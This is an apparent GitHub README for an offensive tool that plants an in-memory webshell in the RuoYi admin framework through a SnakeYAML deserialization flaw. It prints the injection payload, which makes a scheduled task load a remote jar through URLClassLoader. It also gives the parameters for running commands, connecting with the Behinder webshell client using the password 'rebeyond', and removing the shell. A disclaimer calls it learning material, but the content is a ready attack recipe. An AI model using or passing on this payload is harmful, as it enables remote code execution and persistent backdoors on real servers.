# yaml-payload-for-ruoyi
**分析文章**

https://xz.aliyun.com/t/10651

**注入方法：**  
把jar放到系统可以访问的地方，在定时任务创建新的定时任务，再立即执行一次即可
```java
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["you_url_of_jar"]]]]')
```
![image-20211127160033485](http://image.lz2y.top/image-20211127160033485.png)

若依 snakeyaml 反序列化漏洞注入内存马

**RuoYi**  
1. 直接执行命令：?cmd=whoami
2. 连接冰蝎：/login?cmd=1（cmd不为空即可），密码为rebeyond，使用冰蝎正常连接即可
3. 卸载内存马：?cmd=delete

![image](https://user-images.githubusercontent.com/55266300/140618949-9973ce81-9308-4bc3-9dd7-286c7281ce33.png)
**RuoYi Vue**  

1. 直接执行命令：`/dev-api/?cmd=whoami`
2. 连接冰蝎：暂不支持
3. 卸载内存马：`/dev-api/?cmd=delete`



**项目仅供学习使用，任何未授权检测造成的直接或者间接的后果及损失，均由使用者本人负责**
